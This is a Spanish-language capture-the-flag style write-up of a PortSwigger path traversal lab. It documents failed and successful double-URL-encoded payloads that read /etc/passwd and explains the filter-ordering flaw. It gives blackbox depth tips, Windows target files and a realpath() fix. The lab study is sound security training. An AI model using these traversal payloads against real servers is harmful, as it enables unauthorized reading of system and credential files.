---
title: "Lab: File path traversal, traversal sequences stripped with superfluous URL-decode"
date: 2026-05-18
category: "Path Traversal"
order: 5
tags: ["web-security-academy", "path-traversal", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/path-traversal-lab-superfluous-url-decode.html
---

## Descripción de la vulnerabilidad

Esta variante de Path Traversal tiene un filtro que opera en dos pasos:

1. **Bloquea secuencias `../`** — si encuentra `../` en el input, lo rechaza.
2. **Hace URL-decode del input** antes de usarlo para leer el archivo.

El descuido está en el **orden** de esas dos operaciones. El filtro valida primero y decodifica después — eso significa que si encodeás `../` una vez más de lo normal, el filtro no lo reconoce, pero el servidor sí lo resuelve al decodificar.

---

## Reconocimiento

Mismo vector de siempre — parámetro `filename` que interactúa con el filesystem:

```
GET /image?filename=18.jpg
```

---

## Concepto clave: Doble URL Encoding

Normalmente `/` se encodea como `%2F`. El servidor al decodificar `%2F` obtiene `/`.

Con doble encoding: `/` → `%2F` → `%252F`. El `%25` es el encoding de `%`, entonces `%252F` es literalmente `%2F` encodeado.

Cuando el servidor decodifica `%252F`:

- Primera decodificación: `%252F` → `%2F`
- Segunda decodificación: `%2F` → `/`

El filtro ve `%252F` y no reconoce ningún `../` — deja pasar el payload. Luego el servidor decodifica dos veces y resuelve la ruta real.

---

## Pruebas realizadas

### Payloads que fallaron ❌

<table>
<tr><td>Payload (legible)</td><td>Payload enviado</td><td>Razón</td></tr>
<tr><td><code>../</code></td><td><code>../</code></td><td>Bloqueado — <code>../</code> literal detectado</td></tr>
<tr><td><code>../../etc/passwd</code></td><td><code>../../etc/passwd</code></td><td>Bloqueado — <code>../</code> literal</td></tr>
<tr><td><code>../../../etc/passwd</code></td><td><code>../../../etc/passwd</code></td><td>Bloqueado — <code>../</code> literal</td></tr>
<tr><td><code>/etc/passwd</code></td><td><code>/etc/passwd</code></td><td>No acepta rutas absolutas</td></tr>
<tr><td><code>....//....//etc/passwd</code></td><td><code>....//....//etc/passwd</code></td><td>Bloqueado en este lab</td></tr>
<tr><td><code>../../etc/passwd</code></td><td><code>..%2F..%2Fetc%2Fpasswd</code></td><td>Un solo nivel de encoding — filtro lo detecta tras decodificar</td></tr>
<tr><td><code>../../etc/passwd</code></td><td><code>..%252F..%252Fetc%252Fpasswd</code></td><td>Doble encoding correcto, pero solo 2 niveles — no llega a la raíz</td></tr>
</table>

El último es importante — el encoding era correcto desde el principio, pero faltaba un nivel de traversal.

### Payloads que funcionaron ✅

**Payload legible:**

```
../../../etc/passwd
```

**Enviado con doble encoding:**

```
..%252F..%252F..%252Fetc%252Fpasswd
```

**Variantes que también funcionaron:**

```
%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%2fpasswd
..%252f..%252f..%252fetc/passwd
```

Las tres expresan lo mismo con distintos niveles de encoding en los puntos y las barras.

---

## Explotación exitosa

```
GET /image?filename=..%252F..%252F..%252Fetc%252Fpasswd
```

**Respuesta:** `200 OK` — contenido completo de `/etc/passwd`.

---

## ¿Por qué funcionó el doble encoding?

El servidor procesa el input en este orden:

```
Input recibido:  ..%252F..%252F..%252Fetc%252Fpasswd

Paso 1 — Filtro busca "../":
  Ve "..%252F" → no reconoce "../" → deja pasar

Paso 2 — Servidor decodifica:
  %252F → %2F → /
  Resultado: ../../../etc/passwd

Paso 3 — SO resuelve la ruta:
  ../../../etc/passwd → /etc/passwd
```

El filtro valida el input crudo antes de decodificar — ese es el descuido.

---

## ¿Por qué fallaron 2 niveles pero funcionaron 3?

No era un problema de encoding — era un problema de profundidad. El servidor sirve imágenes desde un directorio a 3 niveles de profundidad desde la raíz (`/var/www/images/`). Con solo 2 niveles de `../` no se llega a la raíz:

```
2 niveles: /var/www/images/../../etc/passwd → /var/etc/passwd  ❌ no existe
3 niveles: /var/www/images/../../../etc/passwd → /etc/passwd   ✅
```

**En un blackbox:** si no sabés cuántos niveles necesitás, empezá siempre con 3 — cubre la mayoría de servidores Linux estándar. Si falla, subí a 4.

---

## ¿Y si fuera Windows?

<table>
<tr><td>Indicador</td><td>Windows</td><td>Linux</td></tr>
<tr><td>Header <code>Server:</code></td><td><code>Microsoft-IIS/10.0</code></td><td><code>Apache/Ubuntu</code>, <code>nginx</code></td></tr>
<tr><td>Extensiones en la app</td><td><code>.aspx</code>, <code>.asp</code></td><td><code>.php</code>, sin extensión</td></tr>
<tr><td>Rutas en errores</td><td><code>C:\inetpub\wwwroot\</code></td><td><code>/var/www/html/</code></td></tr>
</table>

En Windows el traversal sigue funcionando con `/` porque IIS acepta ambos separadores, pero los archivos objetivo cambian: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`. La regla práctica es probar como Linux primero — es más común en servidores web.

---

## Comparativa de todos los labs hasta ahora

<table>
<tr><td>Lab</td><td>Filtro</td><td>Bypass</td></tr>
<tr><td>Simple case</td><td>Sin filtro</td><td><code>../../../etc/passwd</code> directo</td></tr>
<tr><td>Absolute path bypass</td><td>Bloquea <code>../</code></td><td>Ruta absoluta <code>/etc/passwd</code></td></tr>
<tr><td>Stripped non-recursively</td><td>Elimina <code>../</code> una vez</td><td><code>....//</code> para regenerar <code>../</code></td></tr>
<tr><td>Superfluous URL-decode (este)</td><td>Bloquea <code>../</code>, luego decodifica</td><td>Doble encoding <code>..%252F</code></td></tr>
</table>

---

## Prevención correcta

El problema aquí es el orden de operaciones. La app debería **decodificar primero y validar después** — o mejor aún, usar `realpath()` que resuelve todo independientemente del encoding:

```python
import os

BASE = "/var/www/images"
filename = request.params["filename"]  # ya viene decodificado por el framework

full_path = os.path.realpath(os.path.join(BASE, filename))

if not full_path.startswith(BASE):
    return 400, "Acceso denegado"

open(full_path)
```

Con `realpath()` no importa cuántas capas de encoding tenga el payload — siempre resuelve la ruta final y valida contra el directorio base.

---

## Lecciones aprendidas

- "Superfluous URL-decode" significa que el servidor decodifica el input después de validarlo — ese es el gap.
- Doble encoding: `%252F` sobrevive el filtro porque no parece `../`, pero el servidor lo resuelve a `/` tras dos decodificaciones.
- Si el payload con doble encoding falla, antes de cambiar de técnica verificá que tengas suficientes niveles de traversal.
- Siempre empezá con 3 niveles de `../` — cubre la mayoría de casos.
- La comparativa de labs muestra que cada filtro tiene su bypass específico — el razonamiento sobre qué hace el filtro es más importante que memorizar payloads.

---

## Referencia

Lab oficial: [PortSwigger — File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal)

**Estado:** Solved
